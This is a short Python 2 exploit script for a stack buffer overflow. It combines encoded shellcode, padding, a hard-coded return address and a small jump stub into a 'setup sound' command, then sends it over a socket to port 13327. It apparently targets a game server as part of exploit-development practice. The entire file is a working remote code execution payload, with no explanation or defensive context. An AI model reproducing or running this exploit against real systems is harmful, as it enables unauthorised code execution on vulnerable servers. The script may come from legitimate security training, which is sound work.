#!/usr/bin/python
import socket

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#nasm > exit


host = "127.0.0.1"
# return address 0x08134597

shellcode=("\xba\xc1\xd0\x1c\x33\xdb\xc1\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x14\x31\x55\x14\x83\xed\xfc\x03\x55\x10\x23\x25\x2d\xe8\x54"
"\x25\x1d\x4d\xc9\xc0\xa0\xd8\x0c\xa4\xc3\x17\x4e\x9e\x55\xfa"
"\x26\x23\x6a\xeb\xea\x49\x7a\x5a\x42\x07\x9b\x36\x04\x4f\x91"
"\x47\x41\x2e\x2d\xfb\x55\x01\x4b\x36\xd5\x22\x24\xae\x18\x24"
"\xd7\x76\xc8\x1a\x80\x45\x8c\x2c\x49\xae\xe4\x81\x86\x3d\x9c"
"\xb5\xf7\xa3\x35\x28\x81\xc7\x95\xe7\x18\xe6\xa5\x03\xd6\x69")

ret="\x97\x45\x13\x08"

crash=shellcode + "\x41" * (4368-105) +ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()
print "[*]Payload Sent !"
